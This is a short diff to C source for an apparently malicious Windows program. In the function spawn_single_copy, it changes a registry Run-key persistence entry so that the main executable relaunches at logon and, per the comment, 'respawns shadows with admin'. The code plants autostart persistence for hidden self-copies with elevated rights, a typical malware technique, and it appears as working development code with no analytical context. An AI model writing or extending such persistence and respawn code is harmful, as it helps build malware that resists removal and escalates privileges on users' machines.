@@ -396,14 +396,12 @@ static void spawn_single_copy(const char *filename, const char *regKey) {
         return;
     }
 
-    /* Register persistence */
+    /* Register persistence — point to MAIN .exe so it can respawn shadows with admin */
     HKEY hKey;
     if (RegOpenKeyExA(HKEY_CURRENT_USER,
             "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
             0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
-        char runCmd[MAX_PATH * 2];
-        snprintf(runCmd, sizeof(runCmd), "\"%s\" --shadow", destPath);
-        RegSetValueExA(hKey, regKey, 0, REG_SZ, (BYTE*)runCmd, (DWORD)strlen(runCmd) + 1);
+        RegSetValueExA(hKey, regKey, 0, REG_SZ, (BYTE*)currentPath, (DWORD)strlen(currentPath) + 1);
         RegCloseKey(hKey);
     }
 
